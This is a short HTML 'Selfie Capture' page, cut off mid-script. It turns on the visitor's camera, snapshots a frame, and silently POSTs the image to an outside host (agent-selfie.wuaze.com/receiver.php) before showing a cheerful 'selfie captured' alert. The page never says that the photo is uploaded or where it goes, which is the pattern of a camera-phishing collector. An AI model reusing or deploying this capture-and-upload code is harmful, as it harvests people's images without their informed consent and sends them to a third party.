<!DOCTYPE html>
<html>
<head>
  <title>Selfie Capture</title>
</head>
<body>
  <h1>📸 Taking your selfie...</h1>
  <video id="video" width="320" height="240" autoplay muted></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataURL = canvas.toDataURL('image/png');

          fetch("https://agent-selfie.wuaze.com/receiver.php", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ image: dataURL })
          })
          .then(res => res.text())
          .then(link => {
            console.log("Saved selfie link:", link);
            // Show the link or redirect
            alert("Your selfie has been captured! 📸");
            // window.location.href = link; // uncomme
